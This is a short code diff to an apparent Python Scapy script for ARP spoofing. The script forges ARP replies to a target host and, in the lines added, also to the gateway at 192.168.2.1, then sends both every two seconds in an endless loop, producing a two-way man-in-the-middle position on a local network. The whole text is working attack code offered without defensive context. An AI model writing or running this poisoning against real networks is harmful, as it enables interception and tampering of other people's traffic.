@@ -27,8 +27,16 @@ poisonedTarget.op = 2
 # The packet by default will have our mac address as a source. Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
 poisonedTarget.psrc = "192.168.2.1"
 
+
+poisonedGateway = ARP()
+poisonedGateway.op = 2
+poisonedGateway.pdst = "192.168.2.1"
+poisonedGateway.psrc = "192.168.2.6"
+
+
 # Keep poisoning the ARP;
 while True:
     print('Poisoning ' + str(poisonedTarget.pdst))
     send(poisonedTarget, verbose=False)
+    send(poisonedGateway, verbose=False)
     time.sleep(2)
